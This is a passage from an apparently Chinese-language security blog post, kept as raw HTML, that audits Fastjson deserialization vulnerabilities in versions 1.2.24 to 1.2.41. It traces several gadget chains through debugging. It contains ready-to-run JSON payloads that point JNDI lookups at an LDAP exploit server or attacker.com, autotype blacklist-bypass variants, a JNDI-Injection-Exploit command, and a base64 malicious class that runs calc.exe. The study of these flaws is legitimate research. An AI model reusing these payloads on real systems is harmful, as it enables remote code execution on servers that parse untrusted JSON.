class="hljs-variable">classCount</span> <span class="hljs-operator">=</span> _bytecodes.length;<br>        _class = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[classCount];<br><br>        <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;<br>            _auxClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>            _class[i] = loader.defineClass(_bytecodes[i]);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> _class[i].getSuperclass();<br><br>            <span class="hljs-comment">// Check if this is the main class</span><br>            <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>                _transletIndex = i;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                _auxClasses.put(_class[i].getName(), _class[i]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;<br>            ErrorMsg err= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (ClassFormatError e) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (LinkageError e) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后会检查<code>_bytecodes</code>是否为空不是的话就会通过<code>TransletClassLoader</code>加载外部字节码</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745770019641-2e8beeb3-6d26-45de-9091-3799d27bf39a.png"></p><p>并且这里实例化需要<code>_tfactor</code>在<code>_tfactory.getExternalExtensionsMap()</code>，没有该字段会抛出异常，即使是空的，但也是空对象能调用<code>getExternalExtensionsMap()</code>返回<code>null</code>而不是<code>null.getExternalExtensionsMap()</code>抛出异常</p><p>这里加载<code>_bytecodes</code>。并通过<code>defineClass()</code>将字节码转换为 <code>Class&lt;?&gt; </code>对象并执行静态方法</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745770158191-56fa0362-2f3b-4c60-906c-244ab5fd646a.png"></p><p>这里检查有没有继承<code>AbstractTranslet</code>的类，如果没有就会抛出异常，这就是为什么poc的类需要继承<code>AbstractTranslet</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745770351936-c27a0759-3afa-4381-8354-8d37b102ac5f.png"></p><p>整个gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parse() -&gt; scanSymbol()传入<span class="hljs-meta">@type</span> -&gt; ParserConfig#checkAutoType -&gt; TypeUtils.loadClass -&gt; ObjectDeserializer -&gt; JdbcRowSetImpl -&gt; getOutputProperties() -&gt; newTransformer() -&gt; getTransletInstance() -&gt; defineTransletClasses() -&gt; defineClass()<br></code></pre></td></tr></table></figure><h3 id="JndiDataSourceFactory-需要-mybatis依赖"><a href="#JndiDataSourceFactory-需要-mybatis依赖" class="headerlink" title="JndiDataSourceFactory 需要 mybatis依赖"></a>JndiDataSourceFactory 需要 mybatis依赖</h3><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br><br>    &lt;dependency&gt;<br>        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>        &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.24</span>&lt;/version&gt;<br>    &lt;/dependency&gt;<br><br>    &lt;dependency&gt;<br>        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;<br>        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;<br>        &lt;version&gt;<span class="hljs-number">3.5</span><span class="hljs-number">.7</span>&lt;/version&gt;<br>    &lt;/dependency&gt;<br><br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure><p><code>./java -jar ../JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#39;calc.exe&#39; -A &#39;192.168.100.128&#39;</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745823728217-8e1fb6af-ec69-44d1-aef7-17b4eedf9552.png"></p><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br><br></code></pre></td></tr></table></figure><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: \&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;properties\&quot;: &#123;&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;data_source\&quot;: \&quot;ldap://192.168.100.128:1389/Exploit\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parse(payload);    <span class="hljs-comment">// 将 JSON 格式的字符串解析（反序列化）为 Java 对象</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745823768688-7910894d-ead5-4097-8c17-0d52cdb5b39d.png"></p><h4 id="审计-1"><a href="#审计-1" class="headerlink" title="审计"></a>审计</h4><p>在<code>D:\maven_repo\com\alibaba\fastjson\1.2.24\fastjson-1.2.24.jar!\com\alibaba\fastjson\util\TypeUtils.class：802</code>的<code>loadClass</code>方法下个断点</p><p>然后调试</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745824558371-d5624c25-9f53-4f34-b31c-180f22c09427.png"></p><p>来到<code>D:\maven_repo\org\mybatis\mybatis\3.5.7\mybatis-3.5.7.jar!\org\apache\ibatis\datasource\jndi\JndiDataSourceFactory.class</code></p><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<br>  <span class="hljs-string">&quot;properties&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://attacker.com/exp&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>字段为<code>properties``data_source</code>，到这个类的gadget的起点肯定是<code>properties</code>的<code>getter</code>或者<code>setter</code>，找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProperties</span><span class="hljs-params">(Properties properties)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> getEnvProperties(properties);<br>        InitialContext initCtx;<br>        <span class="hljs-keyword">if</span> (env == <span class="hljs-literal">null</span>) &#123;<br>            initCtx = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            initCtx = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (properties.containsKey(<span class="hljs-string">&quot;initial_context&quot;</span>) &amp;&amp; properties.containsKey(<span class="hljs-string">&quot;data_source&quot;</span>)) &#123;<br>            <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> (Context)initCtx.lookup(properties.getProperty(<span class="hljs-string">&quot;initial_context&quot;</span>));<br>            <span class="hljs-built_in">this</span>.dataSource = (DataSource)ctx.lookup(properties.getProperty(<span class="hljs-string">&quot;data_source&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (properties.containsKey(<span class="hljs-string">&quot;data_source&quot;</span>)) &#123;<br>            <span class="hljs-built_in">this</span>.dataSource = (DataSource)initCtx.lookup(properties.getProperty(<span class="hljs-string">&quot;data_source&quot;</span>));<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (NamingException var5) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceException</span>(<span class="hljs-string">&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot;</span> + var5, var5);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对<code>data_source</code>调用了<code>lookup</code>方法，可以<code>jndi</code>注入</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745824822157-45919319-685a-4050-aff0-6daccebd6dc7.png"></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745825878093-d9cdd359-8cbc-4e89-beca-b9682e57d09e.png"></p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parse() -&gt; scanSymbol()传入<span class="hljs-meta">@type</span> -&gt; ParserConfig#checkAutoType -&gt; TypeUtils.loadClass -&gt; ObjectDeserializer -&gt; JndiDataSourceFactory -&gt; setProperties() <br></code></pre></td></tr></table></figure><h3 id="com-mchange-v2-c3p0-JndiRefForwardingDataSource"><a href="#com-mchange-v2-c3p0-JndiRefForwardingDataSource" class="headerlink" title="com.mchange.v2.c3p0.JndiRefForwardingDataSource"></a>com.mchange.v2.c3p0.JndiRefForwardingDataSource</h3><p>pom</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">        &lt;dependency&gt;<br>            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.24</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>        &lt;!-- https:<span class="hljs-comment">//mvnrepository.com/artifact/com.mchange.c3p0/com.springsource.com.mchange.v2.c3p0 --&gt;</span><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;com.mchange.c3p0&lt;/groupId&gt;<br>            &lt;artifactId&gt;com.springsource.com.mchange.v2.c3p0&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">0.9</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><span class="hljs-comment">//或者</span><br>&lt;dependency&gt;<br>  &lt;groupId&gt;com.mchange&lt;/groupId&gt;<br>  &lt;artifactId&gt;c3p0&lt;/artifactId&gt;<br>  &lt;version&gt;<span class="hljs-number">0.11</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span>,<br>    <span class="hljs-string">&quot;jndiName&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;loginTimeout&quot;</span>: <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>D:\maven_repo\com\mchange\c3p0\com.springsource.com.mchange.v2.c3p0\0.9.1\com.springsource.com.mchange.v2.c3p0-0.9.1.jar!\com\mchange\v2\c3p0\JndiRefForwardingDataSource.class</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747138982922-f636e4b3-98cd-450e-8655-91e1e1ab7107.png"></p><p><code>setLoginTimeout</code>调用了<code>this.inner()</code>跟进</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747139054764-1eda2710-69f3-40d5-8b67-f137277a69f8.png"></p><p><code>cachedInner=null</code>调用<code>dereference()</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747139123417-41ad0ef4-0334-4ac0-a9e6-033a170b02b6.png"></p><p>调用了<code>lookup()</code>，参数是<code>jndiName</code>,子类没有重写<code>setJndiName</code>，用的是父类的<code>com.mchange.v2.c3p0.impl.JndiRefDataSourceBase#setJndiName</code></p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JndiRefForwardingDataSource.setLoginTimeout -&gt; inner() -&gt; dereference().lookup(JndiName)<br></code></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="1-2-25-≤-FastJson-≤-1-2-41"><a href="#1-2-25-≤-FastJson-≤-1-2-41" class="headerlink" title="1.2.25 ≤ FastJson ≤ 1.2.41"></a>1.2.25 ≤ FastJson ≤ 1.2.41</h1><p>新版对前面版本的漏洞做了修复</p><p>默认关闭<code>autotype</code>并设置白名单和黑名单</p><p>需要开启<code>autotype</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autotype<br></code></pre></td></tr></table></figure><h2 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h2><p><code>jdk 8u101</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.41</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,  <span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br></code></pre></td></tr></table></figure><p><code>./java -jar ../JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#39;calc.exe&#39; -A &#39;192.168.100.128&#39;</code></p><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autotype</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: \&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;dataSourceName\&quot;: \&quot;ldap://192.168.100.128:1389/Exploit\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span>+<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parse(payload);    <span class="hljs-comment">// 将 JSON 格式的字符串解析（反序列化）为 Java 对象</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745853448440-492c4e3a-4d89-49f8-b1ed-88f90d42ba54.png"></p><p>另一种payload。<code>[</code>绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autotype</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://192.168.100.128:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parse(payload);    <span class="hljs-comment">// 将 JSON 格式的字符串解析（反序列化）为 Java 对象</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745858274987-a16e6fd5-51e6-48ec-b4a9-2dba93bb7db6.png"></p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br><br></code></pre></td></tr></table></figure><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autotype</span><br>        <span class="hljs-comment">// 替换为你的正确恶意类字节码(Base64编码)</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">byteCode</span> <span class="hljs-operator">=</span> <span 